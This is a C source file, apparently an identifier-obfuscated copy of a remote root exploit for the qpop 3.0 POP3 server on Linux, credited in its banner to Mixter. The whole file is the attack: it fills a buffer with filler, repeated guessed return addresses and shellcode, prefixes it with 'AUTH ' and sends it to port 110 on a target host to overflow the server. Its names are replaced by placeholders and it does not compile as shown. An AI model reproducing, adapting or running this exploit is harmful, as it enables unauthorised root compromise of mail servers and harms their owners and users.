
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 char VAR_3 ;
 long VAR_4 ;
 int VAR_5 ;
 long FUNC_0 (char*) ;
 scalar_t__ FUNC_1 (int,struct sockaddr*,int) ;
 int VAR_6 ;
 int FUNC_2 (int ) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ,char*,char*) ;
 int FUNC_5 () ;
 int FUNC_6 (int) ;
 int FUNC_7 (char*) ;
 int FUNC_8 (char*,...) ;
 int FUNC_9 (char*) ;
 char* VAR_7 ;
 int FUNC_10 (int ,int ,int ) ;
 int VAR_8 ;
 char* FUNC_11 (int ) ;
 int FUNC_12 (char*) ;
 int FUNC_13 (int,int ) ;
 int FUNC_14 (int,char*,int) ;

int

FUNC_15 (int VAR_9, char **VAR_10)

{

  char VAR_11[VAR_2];

  char *VAR_12 = VAR_7;

  long VAR_13 = VAR_4;

  int VAR_14, VAR_15;

  struct sockaddr_in VAR_16;



  if (VAR_9 < 2)

    {

      FUNC_8 ("usage: %s <host> [offset]\n", VAR_10[0]);

      FUNC_8 ("use offset -1 to try local esp\n");

      FUNC_2 (0);

    }



  if (VAR_9 > 2)

    {

      if (FUNC_0 (VAR_10[2]) == -1)

 {





   VAR_13 = FUNC_5 () - 8000 - VAR_2;

   FUNC_8 ("Using local esp as ret address...\n");

 }

      VAR_13 += FUNC_0 (VAR_10[2]);

    }



  for (VAR_14 = 0; VAR_14 < VAR_2; VAR_14++)

    *(VAR_11 + VAR_14) = VAR_3;



  for (VAR_14 = VAR_1 + 2; VAR_14 < VAR_2; VAR_14 += 4)

    *(int *) &VAR_11[VAR_14] = VAR_13;



  for (VAR_14 = VAR_1; VAR_14 < VAR_1 + FUNC_12 (VAR_7); VAR_14++)

    *(VAR_11 + VAR_14) = *(VAR_12++);



  VAR_11[0] = 'A';

  VAR_11[1] = 'U';

  VAR_11[2] = 'T';

  VAR_11[3] = 'H';

  VAR_11[4] = ' ';



  FUNC_8 ("qpop 3.0 remote root exploit (linux) by Mixter\n");

  FUNC_8 ("[return address: 0x%lx buffer size: %d code size: %d]\n",

   VAR_13, FUNC_12 (VAR_11), FUNC_12 (VAR_7));



  FUNC_3 (0);



  VAR_16.sin_family = VAR_0;

  VAR_16.sin_port = FUNC_6 (110);

  VAR_16.sin_addr.s_addr = FUNC_9 (VAR_10[1]);

  VAR_15 = FUNC_10 (VAR_0, VAR_5, 0);



  if (FUNC_1 (VAR_15, (struct sockaddr *) &VAR_16, sizeof (struct sockaddr)) < 0)

    {

      FUNC_7 ("connect");

      FUNC_2 (0);

    }



  switch (FUNC_14 (VAR_15, VAR_11, FUNC_12 (VAR_11)))

    {

    case 0:

    case -1:

      FUNC_4 (VAR_8, "write error: %s\n", FUNC_11 (VAR_6));

      break;

    default:

      break;

    }

  FUNC_14 (VAR_15, "\n\n", 1);

  FUNC_13 (VAR_15, 0);



  return 0;

}
